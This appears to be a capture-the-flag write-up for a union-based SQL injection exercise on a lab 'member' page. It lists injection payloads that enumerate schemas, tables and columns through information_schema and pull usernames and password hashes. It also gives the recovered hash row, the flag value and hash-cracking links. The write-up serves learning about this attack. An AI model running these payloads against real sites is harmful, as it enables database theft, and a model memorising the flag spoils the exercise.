# UNION BASED SQL INJECTION

## Flag
```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

## Discovery
go to ==> http://{IP_ADDRESS}/index.php?page=member


https://www.sqlinjection.net/table-names/

-1 UNION ALL SELECT table_name,concat(column_name) FROM information_schema.COLUMNS 

Get database names:
>Retrieve database names:
>	-1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--
>Retrieve tables names:
>	-1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Member_Sql_Injection'--
-1 UNION ALL SELECT table_name,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'

-1 UNION SELECT username, password FROM db_default WHERE username=admin
-1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='users'
-1 UNION SELECT first_name, countersign FROM users
-1 UNION SELECT username, password FROM db_default WHERE user_id=5


| user_id | first_name | last_name | town | country | planet | commentaire                                                                   | countersign |
| ------- | ---------- | --------- | ---- | ------- | ------ | ----------------------------------------------------------------------------- | ----------- |
|   5     | flag       | GetThe    |  42  |    42   |   42   | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |

## Helpers:
- [retrieve data from db](https://www.sqlinjection.net/table-names/)
- [dcode - cipher identifier](https://www.dcode.fr/cipher-identifier)
- [md5decrypt - md5](https://md5decrypt.net/en/)
